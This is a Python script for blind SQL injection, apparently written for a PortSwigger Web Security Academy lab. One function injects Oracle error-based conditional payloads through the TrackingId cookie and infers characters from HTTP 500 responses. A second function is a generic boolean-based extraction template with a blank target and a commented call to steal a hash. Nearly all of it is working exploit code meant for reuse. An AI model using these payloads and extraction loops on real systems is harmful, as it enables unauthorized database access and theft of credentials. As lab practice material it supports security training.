#!/usr/bin/env python3

import requests
import re
import sys
import hashlib

target = '' #put sqli vulnerable URL here

query = "(SELECT+CASE+WHEN+(select+ascii(substr((select+'ab'+from+dual),[POS],1))+from+dual)=[CHAR]+THEN+to_char(1/0)+ELSE+'a'+END+FROM+dual)"


def send(query):
    if "[POS]" not in query:
        print("[!] stop! query missing [POS]! quitting!")
        sys.exit()
    if "[CHAR]" not in query:
        print("[!] stop! query missing [CHAR]! quitting!")
        sys.exit()
    burp0_url = "https://0ab900380404dc6dc04bbda7002900c0.web-security-academy.net:443/filter?category=Gifts"
    data = ''
    for i in range(1,2000): #pos
        for j in range(95,100): #char #32,127 #95,100
            payload = "obviouslywrong'||%s||'" % query
            payload = payload.replace("[POS]",str(i))
            payload = payload.replace("[CHAR]",str(j))
            #print("[+] payload: %s" % payload) #only for testing
            burp0_cookies = {"TrackingId": payload, "session": "rPtnckvgje5Bmlu67eBPengl9isfoTfj"}
            burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0a7900e503ffbd76c33dce6300c80004.web-security-academy.net/filter?category=Gifts", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
            r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
            res = r.status_code
            if res == 500:
                extractedchar = chr(j)
                #print("[+] FOUND: %s" % extractedchar) #only for testing
                sys.stdout.write(extractedchar)
                sys.stdout.flush()
                data += extractedchar
                break #break inner loop if found
            else:
                continue
    print("[+] extracted: %s" % data)
send(query)




def send2(sqli):
    for j in range(32, 126):
        # now we update the sqli
        mod_sqli = sqli.replace("[CHR]", str(j))
        payload     = {'some parameter':'1', 'vulnerable parameter':'%s' % mod_sqli}
        r = requests.post(target, data=payload) #, proxies={"http":"http://127.0.0.1:8080"})
        resp = re.search("Any text in response that indicates boolean TRUE", r.text)
        if resp:
            return j
    return None

def exfil2(query):
    data = ""
    query = "select/**/" + query
    query = "ascii(substring((%s),[POS],1))" % query
    for i in range(1,2000):
        sqli = "test'/**/or/**/(%s)=[CHR]/**/or/**/1='" % query
        sqli = sqli.replace('[POS]',str(i))
        #print ('sqli: ' + sqli)
        try:
            extracted_char = chr(send2(sqli))
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
            data += extracted_char
        except:
            return data
    return data


#exfil2(steal_hash) #insert desired sql query here
